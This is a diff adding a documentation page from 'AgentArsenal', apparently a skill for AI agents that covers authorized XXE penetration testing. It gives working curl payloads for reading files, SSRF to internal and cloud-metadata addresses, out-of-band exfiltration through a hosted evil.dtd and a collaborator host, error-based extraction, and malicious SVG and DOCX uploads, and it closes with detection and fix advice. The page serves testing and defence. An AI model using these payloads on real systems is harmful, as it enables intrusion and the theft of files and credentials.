@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: xxe</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>xxe</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing a web application for XML External Entity</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a> <a href="ssrf.html">ssrf</a> <a href="web-sqli.html">web-sqli</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>XML External Entity injection abuses XML parsers that resolve external entities, letting an attacker read local files, pivot to internal services, or exfiltrate data out-of-band. This skill covers the full authorized methodology: locating XML parsers, classic file reads, SSRF via XXE, blind and error-based techniques, and XXE hiding inside file uploads. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find every endpoint that accepts XML: SOAP services, REST endpoints</li>
+<p>with XML bodies, file uploads (SVG, DOCX, XLSX), SAML logins, and document import features.</p>
+<li>Send a benign XML document with a DOCTYPE to see if the parser</li>
+<p>accepts DTDs at all.</p>
+<li>Test classic external entity file read (<code>/etc/passwd</code>, then</li>
+<p>application files).</p>
+<li>Test SSRF through the entity URL (internal hosts, metadata address).</li>
+<li>If nothing reflects, switch to blind out-of-band exfiltration with</li>
+<p>parameter entities.</p>
+<li>Try error-based extraction when errors echo back but content does</li>
+<p>not.</p>
+<li>Probe XXE inside SVG uploads, DOCX files, and multipart uploads.</li>
+<li>Record the payload, parser behavior, and every file or response</li>
+<p>retrieved.</p>
+</ol>
+<h2>1. Finding XML parsers</h2>
+<p>Anywhere the server parses XML is a candidate. Probe with a harmless document first.</p>
+<pre><code class="language-bash"># Baseline: does the endpoint accept XML and echo anything back?
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;user&gt;&lt;name&gt;tester&lt;/name&gt;&lt;/user&gt;&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># DOCTYPE acceptance test: if the parser rejects DOCTYPE outright,
+# classic XXE is dead here (but billion-laughs DoS and other parser
+# quirks may still apply)
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE r [&lt;!ENTITY x &quot;ok&quot;&gt;]&gt;&lt;user&gt;&lt;name&gt;&amp;x;&lt;/name&gt;&lt;/user&gt;&#x27; \
+  | grep -o &#x27;ok&#x27; | head -1</code></pre>
+<p>Also test content-type confusion: some endpoints parse XML even when you send <code>application/json</code> or <code>text/plain</code>, and some parse the body as XML regardless of the declared type.</p>
+<pre><code class="language-bash"># Try the XML body with a JSON content type
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;user&gt;&lt;name&gt;tester&lt;/name&gt;&lt;/user&gt;&#x27; | head -c 200</code></pre>
+<h2>2. Classic in-band file disclosure</h2>
+<p>When the parsed value reflects in the response, read files directly.</p>
+<pre><code class="language-bash"># /etc/passwd first: small, always present, proves file read
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;&#x27; | grep -E &#x27;root:&#x27; | head -3</code></pre>
+<pre><code class="language-bash"># Windows targets: try the Windows paths
+# file:///c:/windows/win.ini
+# file:///c:/boot.ini  (older systems)</code></pre>
+<p>Then walk to high-value files: application config, <code>/proc/self/environ</code> (may leak secrets), and the web root. Read <code>/etc/hosts</code> and <code>/proc/net/tcp</code> for network context on Linux targets where the rules of engagement permit it.</p>
+<p>PHP wrappers add power on PHP stacks:</p>
+<pre><code class="language-bash"># php://filter base64-encodes the file so binary and PHP source survive
+# transport without breaking the XML
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/config.php&quot;&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;&#x27; | grep -o &#x27;[A-Za-z0-9+/=]\{100,\}&#x27; | head -2
+# Pipe the base64 blob through: echo &#x27;&lt;blob&gt;&#x27; | base64 -d</code></pre>
+<h2>3. SSRF through XXE</h2>
+<p>Point the entity at internal URLs instead of files.</p>
+<pre><code class="language-bash"># Internal service probe via XXE
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/admin&quot;&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;&#x27; | head -c 500</code></pre>
+<pre><code class="language-bash"># Cloud metadata via XXE (authorized targets only)
+# &lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;</code></pre>
+<p>Combine with the ssrf skill&#x27;s bypass list when a filter blocks the obvious URLs: alternate IP encodings and redirect tricks apply to entity URLs too.</p>
+<h2>4. Blind out-of-band exfiltration</h2>
+<p>When the response never shows the entity content, exfiltrate with parameter entities, which can do things regular entities cannot (like reading a file and sending it out in one DTD).</p>
+<pre><code class="language-bash"># Step 1: host evil.dtd on your server:
+# &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+# &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;https://YOURID.oastify.com/?x=%file;&#x27;&gt;&quot;&gt;
+# %eval;
+# %exfil;</code></pre>
+<pre><code class="language-bash"># Step 2: reference the remote DTD from the injection
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [&lt;!ENTITY % pe SYSTEM &quot;https://your-server/evil.dtd&quot;&gt; %pe;]&gt;
+&lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;&#x27;
+# Step 3: watch the collaborator for a hit containing the file content</code></pre>
+<p>This works because parameter entities are resolved when the external DTD is parsed, before the main document is validated. If remote DTDs are blocked but local file reads work, use the classic local-DTD trick: reference a DTD file already on the server (for example <code>/usr/share/xml/...</code> on Linux) and redefine one of its entities, which avoids any outbound connection for the DTD itself while still exfiltrating to your collaborator.</p>
+<h2>5. Error-based extraction</h2>
+<p>When errors echo but content does not, make the parser print the file inside its own error message.</p>
+<pre><code class="language-bash"># Trigger a parse error that includes the file content
+curl -s -X POST &#x27;https://target.example/api/user&#x27; \
+  -H &#x27;Content-Type: application/xml&#x27; \
+  -d &#x27;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE r [
+&lt;!ENTITY % f SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % e &quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;&quot;&#x27;&quot;&#x27;file:///nonexistent/%f;&#x27;&quot;&#x27;&quot;&#x27;&gt;&quot;&gt;
+%e; %xxe;
+]&gt;
+&lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;&#x27; | grep -i -E &#x27;error|exception|nonexistent&#x27; | head -5</code></pre>
+<p>The nonexistent file path now contains the passwd content, and the parser&#x27;s &quot;file not found&quot; error prints it. Read the error, decode, and repeat for the next file.</p>
+<h2>6. XXE in file uploads (SVG, DOCX, SAML)</h2>
+<p>XML hides inside uploads. Test each upload feature with an XXE-bearing file.</p>
+<pre><code class="language-bash"># SVG upload: SVG is XML, and many image pipelines parse it
+cat &gt; /tmp/xxe.svg &lt;&lt;&#x27;EOF&#x27;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;100&quot; height=&quot;100&quot;&gt;
+&lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+EOF
+curl -s -X POST &#x27;https://target.example/upload&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -F &#x27;avatar=@/tmp/xxe.svg&#x27; | head -c 400</code></pre>
+<pre><code class="language-bash"># DOCX: unzip, inject XXE into word/document.xml, rezip, upload
+mkdir -p /tmp/docx &amp;&amp; cd /tmp/docx &amp;&amp; unzip -q /tmp/test.docx
+# edit word/document.xml to include the DOCTYPE and entity, then:
+zip -qr /tmp/xxe.docx *
+curl -s -X POST &#x27;https://target.example/upload&#x27; \
+  -b &#x27;session=VICTIMSESSION&#x27; \
+  -F &#x27;doc=@/tmp/xxe.docx&#x27; | head -c 400</code></pre>
+<p>SAML responses are XML too: if you can influence the SAMLResponse (test IdP or a self-registration flow), XXE there can hit the service provider&#x27;s parser. XLSX works like DOCX (it is a zip of XML files).</p>
+<h2>7. Filter bypasses</h2>
+<pre><code class="language-bash"># The filter blocks the string &quot;ENTITY&quot;: some parsers accept lowercase
+# or mixed case in HTML-flavored parsers; real XML is case sensitive,
+# so instead try:
+# - UTF-7 or charset tricks if the parser honors the encoding declaration
+# - Parameter entities instead of general entities (different keyword path)
+# - External DTD instead of inline DOCTYPE when inline is stripped
+# - CDATA sections to smuggle brackets past naive regex filters:
+#   &lt;![CDATA[ ... ]]&gt;</code></pre>
+<p>Test whether the filter runs before or after entity expansion: a filter that scans the raw input misses entities defined in an external DTD, and a filter that scans after expansion misses nothing but may break the application, which tells you where it sits.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The parser resolves entities but the application only echoes part of</li>
+<p>the document. Move the entity reference into the echoed field (username, comment) rather than a silent one.</p>
+<li>Billion laughs / quadratic blowup DoS: <code>&lt;!ENTITY a &quot;xxxxxxxxxx&quot;&gt;</code></li>
+<p>nested expansions can hang the parser. Do NOT test these on production; note the parser accepts recursive entities and move on.</p>
+<li>The parser fetches external DTDs but blocks <code>file://</code>. You still have</li>
+<p>SSRF and blind exfiltration; pivot to those.</p>
+<li>libxml2, Xerces, .NET, and PHP parsers differ in what they allow</li>
+<p>(parameter entities in internal subsets, XInclude). Fingerprint the stack from error messages, then match the technique to the parser.</p>
+<li>XInclude (<code>&lt;xi:include href=&quot;file:///etc/passwd&quot; parse=&quot;text&quot;/&gt;</code>) is</li>
+<p>a separate code path that is sometimes enabled when entities are disabled. Test it explicitly.</p>
+<li>The application validates against an XSD schema first: schema</li>
+<p>validation does not stop entity resolution, so XXE often survives it.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>In-band read works but is truncated: read files in chunks with</li>
+<p><code>php://filter</code> plus string offsets, or exfiltrate blind instead.</p>
+<li>No file scheme: pivot fully to SSRF and metadata, and to XInclude</li>
+<p>over HTTP.</p>
+<li>Remote DTD blocked: use the local-DTD redefinition trick or</li>
+<p>error-based extraction, neither needs an outbound DTD fetch.</p>
+<li>Everything blind and no egress: fall back to timing (entities that</li>
+<p>trigger slow external fetches) to at least prove the parser resolves externals, and report it as blind XXE with limited impact.</p>
+<li>Upload-only XXE with no reflection: check whether the parsed SVG is</li>
+<p>served back to you (avatar URL) or rendered into a PDF; the render step is often where the entity content appears.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see XXE as DOCTYPE declarations and ENTITY keywords arriving in XML input, outbound connections from the app server to internal addresses or collaborator domains during XML processing, and file reads outside the web root in audit logs. The durable fix is to disable DTDs and external entities in every XML parser (the exact flag varies by language: <code>XMLConstants.FEATURE_SECURE_PROCESSING</code> plus disallowing DOCTYPE in Java, <code>libxml_disable_entity_loader</code> era settings in PHP, <code>XmlReader</code> with <code>DtdProcessing.Prohibit</code> in .NET, defusedxml in Python). For uploads, re-encode images instead of parsing uploads as XML where possible. Log rejected DOCTYPEs; a burst of them is active probing.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the parser</li>
+<p>entry point.</p>
+<li>MITRE ATT&amp;CK T1552.005 (Unsecured Credentials: Cloud Instance</li>
+<p>Metadata API): metadata theft via XXE-SSRF.</p>
+<li>CWE-611 (Improper Restriction of XML External Entity Reference).</li>
+<li>CWE-776 (Improper Restriction of Recursive Entity References in</li>
+<p>DTDs): billion laughs.</p>
+<li>CWE-918 (Server-Side Request Forgery): XXE-driven SSRF.</li>
+<li>OWASP Testing Guide: Testing for XML Injection (OTG-INPVAL-008).</li>
+<li>OWASP XXE Prevention Cheat Sheet.</li>
+<li>PortSwigger Web Security Academy: XXE labs and cheat sheet.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
